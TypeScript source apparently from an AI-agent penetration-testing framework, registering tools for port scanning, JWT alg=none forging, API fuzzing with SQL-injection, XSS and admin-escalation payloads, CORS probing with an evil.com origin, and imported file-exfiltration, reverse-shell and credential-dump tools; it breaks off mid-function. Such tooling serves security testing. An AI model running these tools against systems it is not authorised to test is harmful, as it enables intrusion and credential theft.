import { z } from 'zod';
import { tool, DynamicStructuredTool } from '@langchain/core/tools';

// Normalizes common LLM parameter name mistakes for URL fields
// LLMs often guess "param", "target", "targetUrl" instead of "url"
export function u(input: Record<string, unknown>): Record<string, unknown> {
  if (input.url) return input;
  if (typeof input.target === 'string' && input.target) return { ...input, url: input.target };
  if (typeof input.targetUrl === 'string' && input.targetUrl) return { ...input, url: input.targetUrl };
  if (typeof input.target_url === 'string' && input.target_url) return { ...input, url: input.target_url };
  if (typeof input.endpoint === 'string' && input.endpoint) return { ...input, url: input.endpoint };
  return input;
}

import { createHttpFuzzTool } from './http-fuzz';
import { createTemplateScanTool } from './template-scan';
import { createTrivyTool } from './trivy-scan';
import { createSemgrepTool } from './semgrep-scan';
import { createSessionCheckTool, createLoginMacroTool } from './auth-scan';
import { createFileExfilTool, createReverseShellTool, createCredDumpTool } from './post-exploit';
import { createOOBTriggerTool } from './oob-trigger';
import { createOOBFindTool } from './oob-find';
import { createBrowserNavigateTool, createBrowserClickTool, createBrowserFillTool, createBrowserPressKeyTool, createBrowserScreenshotTool, createBrowserExtractTool, createBrowserEvaluateTool, createBrowserCloseTool, createBrowserStartRecordingTool, createBrowserStopRecordingTool, createBrowserGetRecordingTool, createBrowserStartTraceTool, createBrowserStopTraceTool, createBrowserGetTraceTool } from './browser-tools';
import { createGeneratePlaywrightTestTool } from './test-gen-tool';
import { createBuildFlowFromTraceTool } from '../flow/build-from-trace';
import { OOBServer } from '../core/oob-server';
import { BrowserSessionManager } from '../core/browser-session';

type AnyTool = DynamicStructuredTool;

export interface ToolRegistryEntry {
  name: string;
  category: string;
  description: string;
  factory: () => AnyTool;
  tags: string[];
}

export class ToolRegistry {
  private registry: Map<string, ToolRegistryEntry> = new Map();

  register(entry: ToolRegistryEntry): void {
    this.registry.set(entry.name, entry);
  }

  get(name: string): AnyTool | undefined {
    return this.registry.get(name)?.factory();
  }

  getAll(): AnyTool[] {
    const tools: AnyTool[] = [];
    for (const entry of this.registry.values()) tools.push(entry.factory());
    return tools;
  }

  getByCategory(category: string): AnyTool[] {
    const tools: AnyTool[] = [];
    for (const entry of this.registry.values()) {
      if (entry.category === category) tools.push(entry.factory());
    }
    return tools;
  }

  getByTags(tags: string[]): AnyTool[] {
    const tools: AnyTool[] = [];
    for (const entry of this.registry.values()) {
      if (tags.some((t) => entry.tags.includes(t))) tools.push(entry.factory());
    }
    return tools;
  }

  listNames(): string[] { return Array.from(this.registry.keys()); }

  listByCategory(): Record<string, string[]> {
    const result: Record<string, string[]> = {};
    for (const entry of this.registry.values()) {
      if (!result[entry.category]) result[entry.category] = [];
      result[entry.category].push(entry.name);
    }
    return result;
  }

  has(name: string): boolean { return this.registry.has(name); }
}

export const toolRegistry = new ToolRegistry();

// ── HTTP & Network Tools ──

const HttpRequestSchema = z.object({
  method: z.enum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']).optional().default('GET').describe('HTTP method (default: GET)'),
  url: z.string().describe('Target URL to send the request to'),
  headers: z.record(z.string()).optional().describe('Optional HTTP headers as key-value pairs'),
  body: z.record(z.unknown()).optional().describe('Optional request body as JSON object'),
  followRedirects: z.boolean().optional().default(true).describe('Whether to follow HTTP redirects'),
});

toolRegistry.register({
  name: 'http_request',
  category: 'network',
  description: 'Send an HTTP request to a target URL with custom method, headers, and body',
  tags: ['http', 'api', 'request'],
  factory: () => tool(async (input) => {
    const { method, url, headers, body, followRedirects } = HttpRequestSchema.parse(u(input));
    try {
      const response = await fetch(url, { method, headers: headers || {}, body: body ? JSON.stringify(body) : undefined, redirect: followRedirects !== false ? 'follow' : 'manual' });
      const responseHeaders: Record<string, string> = {};
      response.headers.forEach((v, k) => { responseHeaders[k] = v; });
      const contentType = response.headers.get('content-type') || '';
      const responseBody = contentType.includes('json') ? JSON.stringify(await response.json(), null, 2) : await response.text();
      return `HTTP ${response.status} ${response.statusText}\nHeaders: ${JSON.stringify(responseHeaders, null, 2)}\nBody: ${responseBody.slice(0, 3000)}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'http_request', description: 'Send an HTTP request to a target URL', schema: HttpRequestSchema }),
});

const PortScanSchema = z.object({
  host: z.string().describe('Hostname or IP address to scan'),
  ports: z.array(z.number()).optional().describe('Specific ports to scan (overrides range)'),
  range: z.string().optional().describe('Port range like "1-1024"'),
});

toolRegistry.register({
  name: 'port_scan',
  category: 'network',
  description: 'Scan a host for open ports and identify services',
  tags: ['network', 'ports', 'infrastructure'],
  factory: () => tool(async (input) => {
    const { host, ports, range } = PortScanSchema.parse(input);
    const net = await import('net');
    const targetPorts = ports || parseRange(range) || [80, 443, 3000, 8080, 8443];
    const results: Array<{ port: number; status: string; service?: string }> = [];
    const commonServices: Record<number, string> = { 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP', 443: 'HTTPS', 3000: 'Node.js', 3306: 'MySQL', 5432: 'PostgreSQL', 6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB' };

    await Promise.all(targetPorts.map((port: number) => new Promise<void>((resolve) => {
      const socket = new net.Socket();
      const timeout = setTimeout(() => { socket.destroy(); results.push({ port, status: 'filtered' }); resolve(); }, 2000);
      socket.on('connect', () => { clearTimeout(timeout); socket.destroy(); results.push({ port, status: 'open', service: commonServices[port] }); resolve(); });
      socket.on('error', () => { clearTimeout(timeout); results.push({ port, status: 'closed' }); resolve(); });
      socket.connect(port, host);
    })));

    results.sort((a, b) => a.port - b.port);
    return `Port scan for ${host}:\n${results.map((r) => `- Port ${r.port}: ${r.status}${r.service ? ` (${r.service})` : ''}`).join('\n')}`;
  }, { name: 'port_scan', description: 'Scan a host for open ports', schema: PortScanSchema }),
});

const HeaderAnalyzeSchema = z.object({
  url: z.string().describe('Target URL to analyze headers for'),
  target: z.string().optional().describe('Alias for url'),
}).transform(v => ({ url: v.url || v.target || '' }));

toolRegistry.register({
  name: 'header_analyze',
  category: 'network',
  description: 'Analyze HTTP security headers for misconfigurations',
  tags: ['http', 'headers', 'security'],
  factory: () => tool(async (input) => {
    const { url } = HeaderAnalyzeSchema.parse(u(input));
    try {
      const response = await fetch(url);
      const headers: Record<string, string> = {};
      response.headers.forEach((v, k) => { headers[k] = v; });
      const securityHeaders = [
        { name: 'strict-transport-security', risk: 'Missing HSTS - vulnerable to downgrade attacks' },
        { name: 'content-security-policy', risk: 'Missing CSP - vulnerable to XSS' },
        { name: 'x-content-type-options', risk: 'Missing X-Content-Type-Options - MIME sniffing risk' },
        { name: 'x-frame-options', risk: 'Missing X-Frame-Options - clickjacking risk' },
        { name: 'referrer-policy', risk: 'Missing Referrer-Policy - information leakage' },
        { name: 'permissions-policy', risk: 'Missing Permissions-Policy' },
      ];
      const issues = securityHeaders.filter((h) => !headers[h.name]).map((h) => `- ⚠️ ${h.risk}`);
      return `Security headers for ${url}:\nServer: ${headers['server'] || headers['x-powered-by'] || 'Unknown'}\n\nMissing:\n${issues.length > 0 ? issues.join('\n') : 'None - all critical headers present'}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'header_analyze', description: 'Analyze HTTP security headers', schema: HeaderAnalyzeSchema }),
});

// ── Reconnaissance Tools ──

const TechDetectSchema = z.object({
  url: z.string().describe('Target URL to detect technologies on'),
  target: z.string().optional().describe('Alias for url'),
}).transform(v => ({ url: v.url || v.target || '' }));

toolRegistry.register({
  name: 'tech_detect',
  category: 'recon',
  description: 'Detect technologies, frameworks, and servers used by a website',
  tags: ['recon', 'technology', 'frameworks'],
  factory: () => tool(async (input) => {
    const { url } = TechDetectSchema.parse(u(input));
    try {
      const response = await fetch(url);
      const headers: Record<string, string> = {};
      response.headers.forEach((v, k) => { headers[k] = v; });
      const technologies: string[] = [];
      const server = headers['server']?.toLowerCase();
      if (server) { if (server.includes('nginx')) technologies.push('Nginx'); if (server.includes('apache')) technologies.push('Apache'); if (server.includes('iis')) technologies.push('Microsoft IIS'); if (server.includes('cloudflare')) technologies.push('Cloudflare'); }
      const html = await response.text();
      if (html.includes('react') || html.includes('__next')) technologies.push('React/Next.js');
      if (html.includes('angular')) technologies.push('Angular');
      if (html.includes('vue')) technologies.push('Vue.js');
      if (html.includes('laravel')) technologies.push('Laravel');
      if (html.includes('django')) technologies.push('Django');
      if (html.includes('rails')) technologies.push('Ruby on Rails');
      if (html.includes('wp-')) technologies.push('WordPress');
      if (headers['x-powered-by']) technologies.push(headers['x-powered-by']);
      return `Technologies for ${url}:\n${technologies.map((t) => `- ${t}`).join('\n') || '- Unknown'}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'tech_detect', description: 'Detect technologies and frameworks', schema: TechDetectSchema }),
});

// ── Code Analysis Tools ──

const PatternMatchSchema = z.object({
  path: z.string().describe('File system path to scan'),
  patterns: z.array(z.object({ name: z.string().describe('Pattern name'), regex: z.string().describe('RegExp source'), severity: z.enum(['critical', 'high', 'medium', 'low']).describe('Severity level') })).optional().describe('Custom patterns to scan for'),
});

toolRegistry.register({
  name: 'pattern_match',
  category: 'code',
  description: 'Scan source code for security vulnerability patterns',
  tags: ['code', 'sast', 'static-analysis'],
  factory: () => tool(async (input) => {
    const { path: scanPath, patterns } = PatternMatchSchema.parse(input);
    const fs = await import('fs');
    const pathModule = await import('path');
    const vulnPatterns = (patterns || [
      { name: 'sql_injection', regex: /(?:query|execute|exec)\s*\(.*\+.*\)/i, severity: 'critical' as const },
      { name: 'xss_reflected', regex: /res\.write\s*\(.*req\./i, severity: 'high' as const },
      { name: 'hardcoded_secret', regex: /(?:api[_-]?key|secret|password|token)\s*[=:]\s*['"][^'"]{8,}['"]/i, severity: 'high' as const },
      { name: 'eval_execution', regex: /eval\s*\(/i, severity: 'critical' as const },
      { name: 'command_injection', regex: /(?:exec|spawn|execSync)\s*\(.*\+.*\)/i, severity: 'critical' as const },
      { name: 'path_traversal', regex: /(?:readFile|readFileSync)\s*\(.*req\./i, severity: 'high' as const },
      { name: 'weak_crypto', regex: /(?:md5|sha1|DES|RC4)/i, severity: 'medium' as const },
    ]).map((p) => ({ ...p, regex: typeof p.regex === 'string' ? new RegExp(p.regex, 'i') : p.regex }));

    const files = getAllFiles(scanPath);
    const findings: Array<{ file: string; line: number; pattern: string; severity: string; code: string }> = [];

    for (const file of files.slice(0, 100)) {
      try {
        const content = fs.readFileSync(file, 'utf-8');
        const lines = content.split('\n');
        for (const pattern of vulnPatterns) {
          for (let i = 0; i < lines.length; i++) {
            if (pattern.regex.test(lines[i])) {
              findings.push({ file: pathModule.relative(scanPath, file), line: i + 1, pattern: pattern.name, severity: pattern.severity, code: lines[i].trim() });
            }
          }
        }
      } catch { /* skip */ }
    }

    if (findings.length === 0) return `No vulnerability patterns found in ${scanPath}`;
    return `Found ${findings.length} potential vulnerabilities in ${scanPath}:\n\n${findings.slice(0, 20).map((f) => `- [${f.severity}] ${f.file}:${f.line} - ${f.pattern}\n  ${f.code}`).join('\n\n')}`;
  }, { name: 'pattern_match', description: 'Scan source code for vulnerability patterns', schema: PatternMatchSchema }),
});

// ── HAR Analysis Tools ──

const HarAnalyzeSchema = z.object({ harPath: z.string().describe('File path to the HAR file') });

toolRegistry.register({
  name: 'har_analyze',
  category: 'recon',
  description: 'Analyze a HAR file for security issues',
  tags: ['har', 'recon', 'network'],
  factory: () => tool(async (input) => {
    const { harPath } = HarAnalyzeSchema.parse(input);
    try {
      const { HARParser } = require('./har-parser');
      const parser = HARParser.fromFile(harPath);
      const urls = parser.getUniqueUrls();
      const sensitive = parser.getSensitiveData();
      const authEndpoints = parser.getAuthEndpoints();

      let report = `HAR Analysis:\n- ${urls.length} unique URLs\n- ${authEndpoints.filter((a: { hasAuth: boolean }) => a.hasAuth).length} authenticated\n- ${authEndpoints.filter((a: { hasAuth: boolean }) => !a.hasAuth).length} unauthenticated\n`;
      if (sensitive.length > 0) {
        report += `\n⚠️ Sensitive data found:\n`;
        for (const s of sensitive.slice(0, 10)) report += `- [${s.type}] ${s.url}\n`;
      }
      return report;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'har_analyze', description: 'Analyze a HAR file for security issues', schema: HarAnalyzeSchema }),
});

// ── JWT Tools ──

const JwtParseSchema = z.object({ token: z.string().describe('JWT token string to decode and analyze') });

toolRegistry.register({
  name: 'jwt_parse',
  category: 'auth',
  description: 'Decode and analyze JWT tokens for security issues (alg=none, expired, weak secrets)',
  tags: ['jwt', 'auth', 'token'],
  factory: () => tool(async (input) => {
    const { token } = JwtParseSchema.parse(input);
    try {
      const parts = token.split('.');
      if (parts.length !== 3) return `Invalid JWT: expected 3 parts, got ${parts.length}`;
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
      const issues: string[] = [];
      if (header.alg === 'none') issues.push('⚠️ CRITICAL: alg=none — token can be forged without signature');
      if (header.alg?.toLowerCase().includes('hs256') && header.alg !== 'HS256') issues.push(`⚠️ Unusual algorithm: ${header.alg}`);
      const now = Math.floor(Date.now() / 1000);
      if (payload.exp && payload.exp < now) issues.push(`⚠️ Token expired at ${new Date(payload.exp * 1000).toISOString()}`);
      if (!payload.exp) issues.push('⚠️ No expiration (exp) claim — token never expires');
      if (!payload.iat) issues.push('⚠️ No issued-at (iat) claim');
      if (payload.iss && !payload.iss.startsWith('https://')) issues.push(`⚠️ Issuer not HTTPS: ${payload.iss}`);
      if (payload.scope?.includes('admin') || payload.role?.includes('admin')) issues.push('ℹ️ Token has admin privileges');
      return `JWT Analysis:\n\nHeader: ${JSON.stringify(header, null, 2)}\n\nPayload: ${JSON.stringify(payload, null, 2)}\n\nIssues:\n${issues.length > 0 ? issues.map((i) => `- ${i}`).join('\n') : 'No obvious issues found'}`;
    } catch (error) { return `Error parsing JWT: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'jwt_parse', description: 'Decode and analyze JWT tokens', schema: JwtParseSchema }),
});

toolRegistry.register({
  name: 'jwt_forge',
  category: 'auth',
  description: 'Forge JWT tokens with arbitrary claims for security testing',
  tags: ['jwt', 'auth', 'forgery', 'testing'],
  factory: () => tool(async (input) => {
    const { header, payload, algorithm } = z.object({
      header: z.record(z.unknown()).optional().default({ alg: 'none', typ: 'JWT' }).describe('JWT header claims'),
      payload: z.record(z.unknown()).describe('JWT payload claims as key-value pairs'),
      algorithm: z.enum(['none', 'HS256']).optional().default('none').describe('Forgery algorithm'),
    }).parse(input);
    try {
      const encodedHeader = Buffer.from(JSON.stringify(header)).toString('base64url');
      const encodedPayload = Buffer.from(JSON.stringify(payload)).toString('base64url');
      const signature = algorithm === 'none' ? '' : Buffer.from('test').toString('base64url');
      const forgedToken = `${encodedHeader}.${encodedPayload}.${signature}`;
      return `Forged JWT (alg=${algorithm}):\n${forgedToken}\n\nHeader: ${JSON.stringify(header, null, 2)}\nPayload: ${JSON.stringify(payload, null, 2)}\n\nUse this token in Authorization header to test for JWT validation bypass.`;
    } catch (error) { return `Error forging JWT: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'jwt_forge', description: 'Forge JWT tokens for security testing', schema: z.object({ header: z.record(z.unknown()).optional().describe('JWT header claims'), payload: z.record(z.unknown()).describe('JWT payload claims'), algorithm: z.enum(['none', 'HS256']).optional().describe('Forgery algorithm') }) }),
});

// ── API & GraphQL Tools ──

const GraphqlIntrospectSchema = z.object({ url: z.string().describe('GraphQL endpoint URL'), headers: z.record(z.string()).optional().describe('Optional HTTP headers for the introspection query') });

toolRegistry.register({
  name: 'graphql_introspect',
  category: 'api',
  description: 'Query GraphQL introspection to enumerate types, queries, mutations, and find IDOR candidates',
  tags: ['graphql', 'api', 'introspection', 'recon'],
  factory: () => tool(async (input) => {
    const { url, headers } = GraphqlIntrospectSchema.parse(u(input));
    const introspectionQuery = `query { __schema { types { name fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } queryType { name } mutationType { name } } }`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', ...headers },
        body: JSON.stringify({ query: introspectionQuery }),
      });
      if (!response.ok) return `GraphQL introspection failed: HTTP ${response.status}`;
      const data = await response.json();
      if (data.errors) return `GraphQL introspection blocked: ${JSON.stringify(data.errors)}`;
      const schema = data.data?.__schema;
      if (!schema) return 'No schema returned';
      const queries = schema.queryType?.name ? schema.types.find((t: Record<string, unknown>) => t.name === schema.queryType.name)?.fields || [] : [];
      const mutations = schema.mutationType?.name ? schema.types.find((t: Record<string, unknown>) => t.name === schema.mutationType.name)?.fields || [] : [];
      const idorCandidates = queries.filter((f: Record<string, unknown>) => {
        const fn = (f.name as string).toLowerCase();
        return fn.includes('id') || fn.includes('user') || fn.includes('get') || fn.includes('find');
      });
      return `GraphQL Schema for ${url}:\n\nQueries: ${queries.length}\n${queries.map((q: Record<string, unknown>) => `- ${q.name}(${Array.isArray(q.args) ? (q.args as Array<Record<string, string>>).map((a) => a.name).join(', ') : ''})`).join('\n')}\n\nMutations: ${mutations.length}\n${mutations.map((m: Record<string, string>) => `- ${m.name}`).join('\n')}\n\nPotential IDOR candidates:\n${idorCandidates.map((c: Record<string, string>) => `- ${c.name}`).join('\n') || 'None identified'}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'graphql_introspect', description: 'Query GraphQL introspection', schema: GraphqlIntrospectSchema }),
});

toolRegistry.register({
  name: 'oauth_audit',
  category: 'auth',
  description: 'Audit OAuth/OIDC callback URLs for missing state, nonce, PKCE, and implicit flow',
  tags: ['oauth', 'oidc', 'auth', 'audit'],
  factory: () => tool(async (input) => {
    const { url } = z.object({
      url: z.string().describe('Target URL containing OAuth/OIDC flows'),
    }).parse(u(input));
    try {
      const response = await fetch(url);
      const html = await response.text();
      const issues: string[] = [];
      const oauthPatterns = html.match(/https?:\/\/[^\s"'<>]*[?&](?:client_id|redirect_uri|response_type|scope)[^\s"'<>]*/gi) || [];
      for (const oauthUrl of oauthPatterns) {
        if (!oauthUrl.includes('state=')) issues.push(`⚠️ Missing state parameter: ${oauthUrl.slice(0, 100)}...`);
        if (!oauthUrl.includes('nonce=')) issues.push(`⚠️ Missing nonce parameter (OIDC): ${oauthUrl.slice(0, 100)}...`);
        if (oauthUrl.includes('response_type=token') || oauthUrl.includes('response_type=id_token')) issues.push(`⚠️ Implicit flow detected: ${oauthUrl.slice(0, 100)}...`);
        if (!oauthUrl.includes('code_challenge=')) issues.push(`⚠️ Missing PKCE code_challenge: ${oauthUrl.slice(0, 100)}...`);
      }
      return issues.length > 0 ? `OAuth/OIDC Issues Found:\n${issues.map((i) => `- ${i}`).join('\n')}` : `No OAuth/OIDC flows detected in ${url}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'oauth_audit', description: 'Audit OAuth/OIDC callback URLs', schema: z.object({ url: z.string().describe('Target URL containing OAuth/OIDC flows') }) }),
});

const CorsAuditSchema = z.object({
  url: z.string().describe('Target URL to test CORS on'),
  target: z.string().optional().describe('Alias for url'),
}).transform(v => ({ url: v.url || v.target || '' }));

toolRegistry.register({
  name: 'cors_audit',
  category: 'api',
  description: 'Test CORS configuration for misconfigurations (wildcard origins, credentials, exposed headers)',
  tags: ['cors', 'api', 'headers', 'misconfiguration'],
  factory: () => tool(async (input) => {
    const { url } = CorsAuditSchema.parse(u(input));
    try {
      const response = await fetch(url, { headers: { Origin: 'https://evil.com' } });
      const acao = response.headers.get('access-control-allow-origin');
      const acac = response.headers.get('access-control-allow-credentials');
      const acam = response.headers.get('access-control-allow-methods');
      const acah = response.headers.get('access-control-allow-headers');
      const issues: string[] = [];
      if (acao === '*') issues.push('⚠️ CRITICAL: CORS allows any origin (wildcard *)');
      if (acao === 'https://evil.com') issues.push('⚠️ CRITICAL: CORS reflects arbitrary Origin — allows https://evil.com');
      if (acao && acac === 'true') issues.push('⚠️ HIGH: CORS allows credentials with origin — session hijacking risk');
      if (acam?.includes('*')) issues.push('⚠️ CORS allows all methods');
      if (acah?.includes('*')) issues.push('⚠️ CORS allows all headers');
      return issues.length > 0 ? `CORS Issues for ${url}:\n${issues.map((i) => `- ${i}`).join('\n')}\n\nHeaders:\n- ACAO: ${acao}\n- ACAC: ${acac}\n- ACAM: ${acam}\n- ACAH: ${acah}` : `CORS appears properly configured for ${url}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'cors_audit', description: 'Test CORS configuration', schema: CorsAuditSchema }),
});

const RateLimitTestSchema = z.object({ url: z.string().describe('Target endpoint URL'), method: z.string().optional().default('POST').describe('HTTP method'), attempts: z.number().optional().default(10).describe('Number of rapid requests to send') });

toolRegistry.register({
  name: 'rate_limit_test',
  category: 'api',
  description: 'Test API endpoints for rate limiting by sending rapid requests',
  tags: ['rate-limit', 'api', 'brute-force', 'testing'],
  factory: () => tool(async (input) => {
    const { url, method, attempts } = RateLimitTestSchema.parse(u(input));
    const results: Array<{ status: number; time: number; headers: Record<string, string> }> = [];
    for (let i = 0; i < attempts; i++) {
      const start = Date.now();
      try {
        const res = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ test: i }) });
        const headers: Record<string, string> = {};
        res.headers.forEach((v, k) => { if (k.includes('rate') || k.includes('limit') || k.includes('retry')) headers[k] = v; });
        results.push({ status: res.status, time: Date.now() - start, headers });
      } catch { results.push({ status: 0, time: Date.now() - start, headers: {} }); }
    }
    const rateLimited = results.filter((r) => r.status === 429 || r.status === 503);
    const hasRateHeaders = results.some((r) => Object.keys(r.headers).length > 0);
    const avgTime = results.reduce((a, b) => a + b.time, 0) / results.length;
    return `Rate Limit Test for ${method} ${url} (${attempts} requests):\n\nResults: ${rateLimited.length}/${attempts} rate limited\nRate limit headers: ${hasRateHeaders ? 'Present' : 'Missing'}\nAvg response time: ${avgTime.toFixed(0)}ms\n\n${rateLimited.length === 0 ? '⚠️ NO RATE LIMITING DETECTED — endpoint is vulnerable to brute force' : `✅ Rate limiting active after ~${results.findIndex((r) => r.status === 429 || r.status === 503) + 1} requests`}`;
  }, { name: 'rate_limit_test', description: 'Test API rate limiting', schema: RateLimitTestSchema }),
});

const ApiFuzzSchema = z.object({ url: z.string().describe('Target API endpoint URL'), method: z.string().optional().default('POST').describe('HTTP method'), params: z.array(z.string()).describe('Parameter names to fuzz') });

toolRegistry.register({
  name: 'api_fuzz',
  category: 'api',
  description: 'Fuzz API parameters for mass assignment, type confusion, and unexpected behavior',
  tags: ['api', 'fuzzing', 'mass-assignment', 'testing'],
  factory: () => tool(async (input) => {
    const { url, method, params } = ApiFuzzSchema.parse(u(input));
    const fuzzPayloads: Record<string, unknown>[] = [
      { isAdmin: true },
      { role: 'admin', isAdmin: true, is_admin: true },
      { price: 0.01, amount: -1, quantity: -999 },
      { id: '1 OR 1=1', search: '<script>alert(1)</script>' },
    ];
    const results: Array<{ payload: string; status: number; response: string }> = [];
    for (const payload of fuzzPayloads) {
      try {
        const body: Record<string, unknown> = { ...Object.fromEntries(params.map((p) => [p, 'test'])), ...payload };
        const res = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
        const text = await res.text();
        results.push({ payload: JSON.stringify(payload).slice(0, 80), status: res.status, response: text.slice(0, 200) });
      } catch (error) { results.push({ payload: JSON.stringify(payload).slice(0, 80), status: 0, response: String(error) }); }
    }
    const interesting = results.filter((r) => r.status === 200 && (r.response.includes('admin') || r.response.includes('true') || r.response.includes('success')));
    return `API Fuzzing for ${method} ${url}:\n\n${results.map((r) => `- Payload: ${r.payload}\n  Status: ${r.status}\n  Response: ${r.response}`).join('\n\n')}\n\n⚠️ Interesting responses: ${interesting.length}\n${interesting.map((r) => `- ${r.payload} → ${r.status}`).join('\n') || 'None — all payloads properly rejected'}`;
  }, { name: 'api_fuzz', description: 'Fuzz API parameters', schema: ApiFuzzSchema }),
});

// ── Cloud & Infrastructure Tools ──

const IamAuditSchema = z.object({ policy: z.string().describe('AWS IAM policy JSON string to audit') });

toolRegistry.register({
  name: 'iam_policy_audit',
  category: 'cloud',
  description: 'Audit AWS IAM policy JSON for privilege escalation primitives and wildcard permissions',
  tags: ['aws', 'iam', 'cloud', 'privilege-escalation'],
  factory: () => tool(async (input) => {
    const { policy } = IamAuditSchema.parse(input);
    try {
      const parsed = JSON.parse(policy);
      const issues: string[] = [];
      const statements = parsed.Statement || [];
      for (const stmt of statements) {
        if (stmt.Effect === 'Allow') {
          const actions = Array.isArray(stmt.Action) ? stmt.Action : [stmt.Action];
          const resources = Array.isArray(stmt.Resource) ? stmt.Resource : [stmt.Resource];
          for (const action of actions) {
            if (action === '*') issues.push('⚠️ CRITICAL: Wildcard (*) action — full account access');
            if (action.includes('iam:Create') || action.includes('iam:Attach')) issues.push(`⚠️ Privilege escalation risk: ${action}`);
            if (action.includes('sts:AssumeRole')) issues.push(`⚠️ Role assumption: ${action} — check target role trust policy`);
          }
          for (const resource of resources) {
            if (resource === '*') issues.push('⚠️ CRITICAL: Wildcard (*) resource — applies to all resources');
          }
        }
      }
      return issues.length > 0 ? `IAM Policy Issues:\n${issues.map((i) => `- ${i}`).join('\n')}` : 'No obvious IAM policy issues found';
    } catch (error) { return `Error parsing IAM policy: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'iam_policy_audit', description: 'Audit AWS IAM policy JSON', schema: IamAuditSchema }),
});

const K8sAuditSchema = z.object({ manifest: z.string().describe('Kubernetes manifest YAML/JSON string to audit') });

toolRegistry.register({
  name: 'k8s_manifest_audit',
  category: 'cloud',
  description: 'Audit Kubernetes manifests for privileged containers, hostNetwork, dangerous capabilities, and wildcard RBAC',
  tags: ['kubernetes', 'cloud', 'containers', 'rbac'],
  factory: () => tool(async (input) => {
    const { manifest } = K8sAuditSchema.parse(input);
    try {
      const parsed = typeof manifest === 'string' ? JSON.parse(manifest) : manifest;
      const issues: string[] = [];
      const containers = parsed.spec?.template?.spec?.containers || parsed.spec?.containers || [];
      for (const container of containers) {
        const sec = container.securityContext || {};
        if (sec.privileged) issues.push(`⚠️ CRITICAL: Privileged container: ${container.name}`);
        if (sec.runAsUser === 0) issues.push(`⚠️ Running as root: ${container.name}`);
        if (sec.capabilities?.add?.includes('ALL') || sec.capabilities?.add?.includes('SYS_ADMIN')) issues.push(`⚠️ Dangerous capabilities: ${container.name}`);
      }
      if (parsed.spec?.template?.spec?.hostNetwork) issues.push('⚠️ hostNetwork enabled — container shares host network namespace');
      if (parsed.spec?.template?.spec?.hostPID) issues.push('⚠️ hostPID enabled — container can see host processes');
      if (parsed.kind === 'ClusterRole' || parsed.kind === 'Role') {
        const rules = parsed.rules || [];
        for (const rule of rules) {
          if (rule.resources?.includes('*') || rule.verbs?.includes('*')) issues.push(`⚠️ Wildcard RBAC: ${rule.resources} ${rule.verbs}`);
        }
      }
      return issues.length > 0 ? `K8s Manifest Issues:\n${issues.map((i) => `- ${i}`).join('\n')}` : 'No obvious K8s security issues found';
    } catch (error) { return `Error parsing K8s manifest: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'k8s_manifest_audit', description: 'Audit Kubernetes manifests', schema: K8sAuditSchema }),
});

const TfAuditSchema = z.object({ path: z.string().describe('File path to the Terraform state file') });

toolRegistry.register({
  name: 'tfstate_audit',
  category: 'cloud',
  description: 'Audit Terraform state files for plaintext secrets, passwords, and sensitive outputs',
  tags: ['terraform', 'cloud', 'secrets', 'iac'],
  factory: () => tool(async (input) => {
    const { path } = TfAuditSchema.parse(input);
    const fs = await import('fs');
    try {
      const content = fs.readFileSync(path, 'utf-8');
      const state = JSON.parse(content);
      const issues: string[] = [];
      const sensitivePatterns = [/password/i, /secret/i, /api_key/i, /token/i, /private_key/i, /connection_string/i];
      const jsonStr = JSON.stringify(state);
      for (const pattern of sensitivePatterns) {
        const matches = jsonStr.match(pattern);
        if (matches) issues.push(`⚠️ Found sensitive data matching: ${pattern.source}`);
      }
      const resources = state.resources || [];
      for (const resource of resources) {
        const attrs = resource.instances?.[0]?.attributes || {};
        for (const [key, value] of Object.entries(attrs)) {
          if (sensitivePatterns.some((p) => p.test(key)) && typeof value === 'string' && value.length > 4) {
            issues.push(`⚠️ Plaintext secret in ${resource.type}.${resource.name}: ${key}`);
          }
        }
      }
      return issues.length > 0 ? `Terraform State Issues:\n${issues.map((i) => `- ${i}`).join('\n')}` : `No plaintext secrets found in ${path}`;
    } catch (error) { return `Error: ${error instanceof Error ? error.message : String(error)}`; }
  }, { name: 'tfstate_audit', description: 'Audit Terraform state files', schema: TfAuditSchema }),
});

// ── Vulnerability Intelligence Tools ──

const CveLookupSchema = z.object({ cveId: z.string().describe('CVE identifier like CVE-2024-12345') });

toolRegistry.register({
  name: 'cve_lookup',
  category: 'vuln-intel',
  description: 'Look up CVE details from NVD with EPSS exploitability scoring',
  tags: ['cve', 'nvd', 'epss', 'vulnerability'],
  factory: () => tool(async (input) => {
    const { cveId } = CveLookupSchema.parse(input);
    try {
      const [nvdRes, epssRes] = await Promise.all([
        fetch(`https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${cveId}`),
        fetch(`https://api.first.org/data/v1/epss?cve=${cveId}`),
      ]);
      const nvdData = await nvdRes.json();
      const epssData = await epssRes.json();
      const cve = nvdData.vulnerabilities?.[0]?.cve;
      if (!cve) return `CVE ${cveId} not found in NVD`;
      const desc = cve.descriptions?.find((d: Record<string, string>) => d.lang === 'en')?.value || 'No description';
